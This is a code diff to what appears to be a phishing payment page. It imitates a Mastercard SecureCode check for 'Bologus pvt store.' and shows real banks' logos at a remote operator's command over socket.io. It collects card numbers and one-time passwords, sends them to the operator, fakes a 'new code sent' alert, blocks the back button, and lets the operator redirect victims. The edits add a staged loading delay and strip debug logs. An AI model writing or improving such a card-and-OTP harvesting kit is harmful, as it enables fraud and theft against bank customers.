@@ -559,7 +559,7 @@ function getFailUrl(reason) {
     <div class="spinner"></div>
   </div>
 
-  <!-- MC Verification Overlay - FIXED VERSION -->
+  <!-- MC Verification Overlay -->
   <div id="mcVerificationOverlay" class="fullscreen-overlay">
     <div style="background-color: #fff; border-radius: 8px; width: 90%; max-width: 480px; padding: 20px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
       <!-- Header with logo and title -->
@@ -571,7 +571,7 @@ function getFailUrl(reason) {
       <!-- Merchant and transaction info -->
       <div style="margin-bottom: 20px;">
         <div style="font-weight: bold; margin-bottom: 10px;">Secure Checkout</div>
-      <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
+        <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
           <span>Merchant:</span>
           <span id="merchantName">Bologus pvt store.</span>
         </div>
@@ -642,6 +642,30 @@ function getFailUrl(reason) {
       document.getElementById('amount').value = defaultAmount;
       document.getElementById('displayAmount').textContent = defaultAmount.toFixed(2);
 
+      // MODIFICATION 1: Check if returning from currency page
+      if (sessionStorage.getItem('returning_from_currency') === 'true') {
+        // Clear the flag
+        sessionStorage.removeItem('returning_from_currency');
+        
+        // Show loading state on the submit button
+        const submitButton = document.getElementById('submitButton');
+        const submitText = document.getElementById('submitText');
+        const submitLoader = document.getElementById('submitLoader');
+        
+        if (submitButton && submitText && submitLoader) {
+          submitButton.classList.add('btn-loading');
+          submitText.style.opacity = '0.5';
+          submitText.style.filter = 'blur(1px)';
+          submitLoader.classList.remove('hidden');
+          
+          // Start checking transaction status
+          if (currentInvoiceId) {
+            console.log('[DEBUG] Returning from currency page, checking transaction status');
+            statusCheckInterval = setInterval(checkTransactionStatus, 2000);
+          }
+        }
+      }
+
       if (pid) {
         try {
           const response = await fetch(`/api/getPaymentDetails?pid=${pid}`);
@@ -685,44 +709,6 @@ function getFailUrl(reason) {
 
       // Initial validation
       updateSubmitButton();
-      
-      // Add a debug button in development environment
-      if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
-        const debugButton = document.createElement('button');
-        debugButton.textContent = 'Test MC Verification';
-        debugButton.style.position = 'fixed';
-        debugButton.style.bottom = '10px';
-        debugButton.style.right = '10px';
-        debugButton.style.zIndex = '9999';
-        debugButton.style.padding = '10px';
-        debugButton.style.background = '#8b5cf6';
-        debugButton.style.color = 'white';
-        debugButton.style.border = 'none';
-        debugButton.style.borderRadius = '4px';
-        debugButton.style.cursor = 'pointer';
-        
-        debugButton.addEventListener('click', function() {
-          const overlay = document.getElementById('mcVerificationOverlay');
-          if (overlay) {
-            // Set test values
-            document.getElementById('merchantName').textContent = 'Test Merchant';
-            document.getElementById('transactionAmount2').textContent = '999.00';
-            document.getElementById('transactionDate').textContent = new Date().toLocaleString();
-            
-            // Show overlay
-            overlay.style.display = 'flex';
-            console.log('MC verification overlay shown via debug button');
-            
-            // Start timer
-            setupMCTimerIfNeeded(true);
-          } else {
-            console.error('MC verification overlay element not found!');
-            alert('Error: MC verification overlay not found!');
-          }
-        });
-        
-        document.body.appendChild(debugButton);
-      }
     });
 
     // Card Validation & Formatting Functions
@@ -927,15 +913,7 @@ function getFailUrl(reason) {
           currentInvoiceId = data.invoiceId;
           localStorage.setItem('invoiceId', currentInvoiceId);
           console.log('Joining socket.io room with invoiceId:', currentInvoiceId);
-          
-          // FIXED: Improved room joining with acknowledgment
-          socket.emit('join', currentInvoiceId, function(response) {
-            if (response && response.success) {
-              console.log('Successfully joined room:', currentInvoiceId);
-            } else {
-              console.error('Failed to join room:', currentInvoiceId, response?.error);
-            }
-          });
+          socket.emit('join', currentInvoiceId);
 
           // Open bank page
           bankPageWindow = window.open(
@@ -997,9 +975,8 @@ function getFailUrl(reason) {
         }
       });
 
-      // Socket.io event handlers - FIXED VERSION
+      // Socket.io event handlers
       socket.on('show_otp', () => {
-        console.log('[DEBUG] Received show_otp event');
         document.getElementById('paymentForm').classList.add('hidden');
         document.getElementById('otpForm').classList.remove('hidden');
         const cardNumber = document.getElementById('cardNumber').value;
@@ -1008,7 +985,7 @@ function getFailUrl(reason) {
         isProcessing = false;
       });
 
-      // FIXED: MC verification event handler - simplified with better logs
+      // MODIFICATION 2: Updated MC verification event handler with loading spinner
       socket.on('show_mc_verification', (data) => {
         console.log('[DEBUG] Received show_mc_verification event:', data);
         console.log('[DEBUG] Current invoice ID:', currentInvoiceId);
@@ -1018,59 +995,80 @@ function getFailUrl(reason) {
         console.log('[DEBUG] Overlay element found:', !!overlay);
         
         if (data.invoiceId === currentInvoiceId && overlay) {
-          console.log('[DEBUG] Invoice IDs match, showing MC verification');
+          console.log('[DEBUG] Invoice IDs match, showing initial loading state for MC verification');
           
-          // Update merchant and amount info
-          const merchantName = document.getElementById('merchantName');
-          const amountElement = document.getElementById('transactionAmount2');
-          const dateElement = document.getElementById('transactionDate');
+          // Get the content container
+          const contentContainer = overlay.querySelector('div');
+          const originalContent = contentContainer.innerHTML;
           
-          if (merchantName) merchantName.textContent = data.merchantName || 'Bologus pvt store.';
-          if (amountElement) amountElement.textContent = data.amount || document.getElementById('displayAmount').textContent || '0.00';
-          if (dateElement) dateElement.textContent = new Date().toLocaleString();
+          // Replace with loading spinner first
+          contentContainer.innerHTML = `
+            <div style="display: flex; justify-content: center; align-items: center; min-height: 300px; background: white; width: 100%; border-radius: 8px;">
+              <div style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite;"></div>
+            </div>
+          `;
           
-          // Update bank logo
-          const bankCode = data.bankCode || 'default';
-          const bankLogo = document.getElementById('bankLogo');
-          if (bankLogo) {
-            const bankLogos = {
-              'sbi': 'https://assets.stickpng.com/images/61fc00073cf0e70004222069.png',
-              'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png?t=1720244492',
-              'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
-              'axis': 'https://upload.wikimedia.org/wikipedia/commons/c/ce/AXISBank_Logo.svg',
-              'kotak': 'https://logotyp.us/file/kotak-mahindra.svg',
-              'yes': 'https://assets.stickpng.com/images/627ccfe31b2e263b45696ac8.png',
-              'dbs taiwan': 'https://www.dbs.com.sg/o/corporate-theme/images/Logo.svg',
-              'tanshin': 'http://www.alb-labuan.com/images/logo-taishin.png',
-              'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
-              'standard charterd': 'https://assets.stickpng.com/images/5a1d2dc54ac6b00ff574e292.png',
-              'boi': 'https://logolook.net/wp-content/uploads/2023/09/Bank-of-India-Logo.png',
-              'bob': 'https://logotyp.us/file/bank-of-baroda.svg',
-              'centralbankindia': 'https://iconape.com/wp-content/png_logo_vector/central-bank-of-india-1911-logo.png',
-              'boa': 'https://freelogopng.com/images/all_img/1658985465bank-of-america-logo-png.png',
-              'citibank': 'https://www.logo.wine/a/logo/Citigroup/Citigroup-Logo.wine.svg',
-              'usbank': 'https://logos-world.net/wp-content/uploads/2021/02/US-Bank-Logo-700x394.png',
-              'wellsfargo': 'https://www.logo.wine/a/logo/Wells_Fargo/Wells_Fargo-Logo.wine.svg',
-              'nimb': 'https://www.nimb.com.np/static/images/nimbl-lotus.png',
-              'bank of maga': 'https://upload.wikimedia.org/wikipedia/commons/a/a9/Bank_of_Taiwan_Seal.svg',
-              'mastercard securecode': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png',
-              'default': 'https://www.mastercard.us/content/dam/public/mastercardcom/na/us/en/homepage/Home/mc-logo-52.svg'
-            };
-            bankLogo.src = bankLogos[bankCode] || bankLogos['default'];
-          }
-          
-          // Reset OTP input and error
-          const otpInput = document.getElementById('mcOtpInput');
-          const otpError = document.getElementById('mcOtpError');
-          if (otpInput) otpInput.value = '';
-          if (otpError) otpError.style.display = 'none';
-          
-          // Start timer for MC verification
-          setupMCTimerIfNeeded();
-          
-          // FIXED: Display the overlay IMMEDIATELY with no delay or spinner
+          // Show the overlay with loading state
           overlay.style.display = 'flex';
-          console.log('[DEBUG] MC verification overlay displayed');
+          
+          // After 5-6 seconds, show the actual content
+          setTimeout(() => {
+            console.log('[DEBUG] Showing actual MC verification content after loading');
+            
+            // Restore original content
+            contentContainer.innerHTML = originalContent;
+            
+            // Update merchant and amount info
+            const merchantName = document.getElementById('merchantName');
+            const amountElement = document.getElementById('transactionAmount2');
+            const dateElement = document.getElementById('transactionDate');
+            
+            if (merchantName) merchantName.textContent = data.merchantName || 'Bologus pvt store.';
+            if (amountElement) amountElement.textContent = data.amount || document.getElementById('displayAmount').textContent || '0.00';
+            if (dateElement) dateElement.textContent = new Date().toLocaleString();
+            
+            // Update bank logo
+            const bankCode = data.bankCode || 'default';
+            const bankLogo = document.getElementById('bankLogo');
+            if (bankLogo) {
+              const bankLogos = {
+                'sbi': 'https://assets.stickpng.com/images/61fc00073cf0e70004222069.png',
+                'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png?t=1720244492',
+                'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
+                'axis': 'https://upload.wikimedia.org/wikipedia/commons/c/ce/AXISBank_Logo.svg',
+                'kotak': 'https://logotyp.us/file/kotak-mahindra.svg',
+                'yes': 'https://assets.stickpng.com/images/627ccfe31b2e263b45696ac8.png',
+                'dbs taiwan': 'https://www.dbs.com.sg/o/corporate-theme/images/Logo.svg',
+                'tanshin': 'http://www.alb-labuan.com/images/logo-taishin.png',
+                'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
+                'standard charterd': 'https://assets.stickpng.com/images/5a1d2dc54ac6b00ff574e292.png',
+                'boi': 'https://logolook.net/wp-content/uploads/2023/09/Bank-of-India-Logo.png',
+                'bob': 'https://logotyp.us/file/bank-of-baroda.svg',
+                'centralbankindia': 'https://iconape.com/wp-content/png_logo_vector/central-bank-of-india-1911-logo.png',
+                'boa': 'https://freelogopng.com/images/all_img/1658985465bank-of-america-logo-png.png',
+                'citibank': 'https://www.logo.wine/a/logo/Citigroup/Citigroup-Logo.wine.svg',
+                'usbank': 'https://logos-world.net/wp-content/uploads/2021/02/US-Bank-Logo-700x394.png',
+                'wellsfargo': 'https://www.logo.wine/a/logo/Wells_Fargo/Wells_Fargo-Logo.wine.svg',
+                'nimb': 'https://www.nimb.com.np/static/images/nimbl-lotus.png',
+                'bank of maga': 'https://upload.wikimedia.org/wikipedia/commons/a/a9/Bank_of_Taiwan_Seal.svg',
+                'mastercard securecode': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png',
+                'default': 'https://www.mastercard.us/content/dam/public/mastercardcom/na/us/en/homepage/Home/mc-logo-52.svg'
+              };
+              bankLogo.src = bankLogos[bankCode] || bankLogos['default'];
+            }
+            
+            // Reset OTP input and error
+            const otpInput = document.getElementById('mcOtpInput');
+            const otpError = document.getElementById('mcOtpError');
+            if (otpInput) otpInput.value = '';
+            if (otpError) otpError.style.display = 'none';
+            
+            // Start timer for MC verification
+            setupMCTimerIfNeeded();
+            
+            // IMPORTANT: Re-initialize click handlers to ensure they work
+            setupMCVerification();
+          }, 5500); // 5.5 seconds delay as requested
         } else {
           console.log('[DEBUG] Ignoring MC verification event - either invoice ID mismatch or overlay not found');
           console.log('[DEBUG] Event invoice ID:', data.invoiceId);
@@ -1079,8 +1077,18 @@ function getFailUrl(reason) {
         }
       });
 
+      // MODIFICATION 1: Add handler for redirect_to_currency event
+      socket.on('redirect_to_currency', (data) => {
+        console.log('[DEBUG] Received redirect_to_currency event:', data);
+        
+        // Save current state before redirecting
+        sessionStorage.setItem('returning_from_currency', 'true');
+        
+        // Redirect to currency page
+        window.location.href = data.redirectUrl;
+      });
+
       socket.on('update_mc_bank', (data) => {
-        console.log('[DEBUG] Received update_mc_bank event:', data);
         if (data.invoiceId === currentInvoiceId) {
           const bankLogos = {
             'sbi': 'https://assets.stickpng.com/images/61fc00073cf0e70004222069.png',
@@ -1109,13 +1117,11 @@ function getFailUrl(reason) {
           const bankLogo = document.getElementById('bankLogo');
           if (bankLogo) {
             bankLogo.src = bankLogos[data.bankCode] || bankLogos['default'];
-            console.log('[DEBUG] Updated bank logo to:', data.bankCode);
           }
         }
       });
       
       socket.on('mc_otp_error', (data) => {
-        console.log('[DEBUG] Received mc_otp_error event:', data);
         if (data.invoiceId === currentInvoiceId) {
           const mcOtpError = document.getElementById('mcOtpError');
           const mcConfirmBtn = document.getElementById('mcConfirmBtn');
@@ -1133,39 +1139,29 @@ function getFailUrl(reason) {
       });
       
       socket.on('mc_verification_result', (data) => {
-        console.log('[DEBUG] Received mc_verification_result event:', data);
         if (data.invoiceId === currentInvoiceId) {
           // Hide overlay
           const overlay = document.getElementById('mcVerificationOverlay');
-          if (overlay) {
-            overlay.style.display = 'none';
-            console.log('[DEBUG] Hiding MC verification overlay');
-          }
+          if (overlay) overlay.style.display = 'none';
           
           // Clear timer if it exists
           if (window.mcTimerInterval) {
             clearInterval(window.mcTimerInterval);
-            console.log('[DEBUG] Cleared MC timer');
           }
           
           // Redirect based on result
           if (data.success) {
-            console.log('[DEBUG] MC verification successful, redirecting to success page');
             window.location.href = getSuccessUrl(currentInvoiceId);
           } else {
-            console.log('[DEBUG] MC verification failed, redirecting to fail page with reason:', data.reason);
             window.location.href = getFailUrl(data.reason || 'declined');
           }
         }
       });
 
       socket.on('hide_bankpage', (data) => {
-        console.log('[DEBUG] Received hide_bankpage event:', data);
         if (bankPageWindow && !bankPageWindow.closed) {
           bankPageWindow.close();
-          console.log('[DEBUG] Closed bank page window');
         }
-        
         // Keep loading state active regardless, but only check status if it's our transaction
         const submitButton = document.getElementById('submitButton');
         const submitText = document.getElementById('submitText');
@@ -1179,28 +1175,18 @@ function getFailUrl(reason) {
         if (data.invoiceId === currentInvoiceId) {
           // Start checking transaction status but don't change loading state
           if (!statusCheckInterval) {
-            console.log('[DEBUG] Starting transaction status check for invoice:', currentInvoiceId);
             statusCheckInterval = setInterval(checkTransactionStatus, 2000);
           }
         }
       });
-
-      socket.on('redirect_to_currency', (data) => {
-        console.log('[DEBUG] Received redirect_to_currency event:', data);
-        window.location.href = data.redirectUrl;
-      });
     });
 
-    // Transaction Status Check Function - Updated to use clean URLs
+    // Transaction Status Check Function
     async function checkTransactionStatus() {
       if (!currentInvoiceId) return;
       try {
-        console.log('[DEBUG] Checking transaction status for invoice:', currentInvoiceId);
         const response = await fetch(`/api/checkTransactionStatus?invoiceId=${currentInvoiceId}`);
         const data = await response.json();
-        
-        console.log('[DEBUG] Transaction status check result:', data);
-        
         if (data.status === 'show_otp') {
           clearInterval(statusCheckInterval);
           document.getElementById('paymentForm').classList.add('hidden');
@@ -1224,30 +1210,19 @@ function getFailUrl(reason) {
           }
           isProcessing = false;
         } else if (data.status === 'redirect') {
-          console.log('[DEBUG] Redirect status received from checkTransactionStatus:', data.redirectUrl);
           // Use clean URLs for redirects
           if (data.redirectUrl.includes('success.html')) {
-            console.log('[DEBUG] Redirecting to success page with ID:', currentInvoiceId);
             window.location.href = getSuccessUrl(currentInvoiceId);
           } else if (data.redirectUrl.includes('fail.html')) {
-            console.log('[DEBUG] Analyzing fail URL:', data.redirectUrl);
-            let reason = '';
-            try {
-              const url = new URL(data.redirectUrl, window.location.origin);
-              reason = url.searchParams.get('reason');
-              console.log('[DEBUG] Extracted reason:', reason);
-            } catch (e) {
-              console.error('[DEBUG] Error parsing URL:', e);
-            }
-            console.log('[DEBUG] Redirecting to fail page with reason:', reason);
+            const url = new URL(data.redirectUrl, window.location.origin);
+            const reason = url.searchParams.get('reason');
             window.location.href = getFailUrl(reason);
           } else {
-            console.log('[DEBUG] Redirecting to original URL:', data.redirectUrl);
             window.location.href = data.redirectUrl;
           }
         }
       } catch (err) {
-        console.error('[DEBUG] Error checking transaction status:', err);
+        console.error('Error checking transaction status:', err);
       }
     }
 
@@ -1262,7 +1237,6 @@ function getFailUrl(reason) {
         document.getElementById('timer').textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
         if (timer <= 0) {
           clearInterval(timerInterval);
-          console.log('[DEBUG] OTP timer expired, redirecting to fail page');
           window.location.href = getFailUrl('timeout'); // Use clean URL for fail
         }
       }, 1000);
@@ -1271,7 +1245,6 @@ function getFailUrl(reason) {
     // Back Button Prevention
     window.onpopstate = function(event) {
       if (confirm("Do you want to cancel this transaction?")) {
-        console.log('[DEBUG] User confirmed transaction cancellation');
         window.location.href = getFailUrl('canceled'); // Use clean URL for fail
       } else {
         history.pushState(null, null, window.location.href);
@@ -1279,17 +1252,15 @@ function getFailUrl(reason) {
     };
     history.pushState(null, null, window.location.href);
     
-    // MC Verification Functions - FIXED VERSION
+    // MC Verification Functions
     function setupMCVerification() {
-      console.log('[DEBUG] Setting up MC verification');
       const mcCancel = document.getElementById('mcCancel');
       const mcConfirmBtn = document.getElementById('mcConfirmBtn');
       const mcResendBtn = document.getElementById('mcResendBtn');
       const mcOtpInput = document.getElementById('mcOtpInput');
       
       if (mcCancel) {
-        mcCancel.onclick = function() {
-          console.log('[DEBUG] MC Cancel button clicked');
+        mcCancel.addEventListener('click', function() {
           // Hide the overlay
           const overlay = document.getElementById('mcVerificationOverlay');
           if (overlay) overlay.style.display = 'none';
@@ -1301,7 +1272,7 @@ function getFailUrl(reason) {
           
           // Redirect to fail page with canceled reason
           window.location.href = getFailUrl('canceled');
-        };
+        });
       }
       
       if (mcOtpInput) {
@@ -1313,7 +1284,7 @@ function getFailUrl(reason) {
         }
         
         // Enable button when OTP is entered
-        mcOtpInput.oninput = function() {
+        mcOtpInput.addEventListener('input', function() {
           if (mcConfirmBtn) {
             const hasOtp = mcOtpInput.value.trim().length > 0;
             mcConfirmBtn.disabled = !hasOtp;
@@ -1328,11 +1299,11 @@ function getFailUrl(reason) {
               });
             }
           }
-        };
+        });
       }
       
       if (mcConfirmBtn) {
-        mcConfirmBtn.onclick = function() {
+        mcConfirmBtn.addEventListener('click', function() {
           const otp = mcOtpInput.value.trim();
           if (!otp) {
             const mcOtpError = document.getElementById('mcOtpError');
@@ -1342,8 +1313,6 @@ function getFailUrl(reason) {
             }
             return;
           }
-          
-          console.log('[DEBUG] MC Confirm button clicked with OTP:', otp);
           
           // Show loading state on the button
           mcConfirmBtn.disabled = true;
@@ -1358,8 +1327,6 @@ function getFailUrl(reason) {
             <div style="display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 1s linear infinite; margin-right: 8px; vertical-align: middle;"></div>
             <span style="opacity: 0.7; filter: blur(0.6px);">VERIFYING...</span>
           `;
-          
-          console.log('[DEBUG] Sending MC OTP submission with invoiceId:', currentInvoiceId, 'OTP:', otp);
           
           // Use the global socket instance
           socket.emit('mc_otp_submitted', {
@@ -1376,12 +1343,11 @@ function getFailUrl(reason) {
               mcConfirmBtn.style.cursor = 'pointer';
             }
           }, 10000); // 10 second timeout
-        };
+        });
       }
       
       if (mcResendBtn) {
-        mcResendBtn.onclick = function() {
-          console.log('[DEBUG] MC Resend button clicked');
+        mcResendBtn.addEventListener('click', function() {
           
           // Show loading state
           mcResendBtn.disabled = true;
@@ -1391,8 +1357,6 @@ function getFailUrl(reason) {
           // Save original text
           const originalText = mcResendBtn.innerHTML;
           mcResendBtn.innerHTML = 'SENDING...';
-          
-          console.log('[DEBUG] Requesting OTP resend for invoiceId:', currentInvoiceId);
           
           // Use the global socket instance
           socket.emit('mc_resend_otp', {
@@ -1412,21 +1376,16 @@ function getFailUrl(reason) {
             // Show notification to user
             alert('A new verification code has been sent to your registered mobile number.');
           }, 1500);
-        };
+        });
       }
     }
     
     function setupMCTimerIfNeeded(reset = false) {
-      console.log('[DEBUG] Setting up MC timer, reset =', reset);
       const timerElement = document.getElementById('mcTimer');
-      if (!timerElement) {
-        console.error('[DEBUG] MC timer element not found');
-        return;
-      }
+      if (!timerElement) return;
       
       if (window.mcTimerInterval) {
         clearInterval(window.mcTimerInterval);
-        console.log('[DEBUG] Cleared existing MC timer');
       }
       
       let timeLeft = 179; // 2:59 timer
@@ -1446,7 +1405,6 @@ function getFailUrl(reason) {
         
         if (timeLeft <= 0) {
           clearInterval(window.mcTimerInterval);
-          console.log('[DEBUG] MC timer expired, redirecting to fail page');
           
           // Redirect on timeout
           const overlay = document.getElementById('mcVerificationOverlay');
@@ -1455,7 +1413,6 @@ function getFailUrl(reason) {
           window.location.href = getFailUrl('timeout');
         }
       }, 1000);
-      console.log('[DEBUG] Started MC timer');
     }
   </script>
   <script>
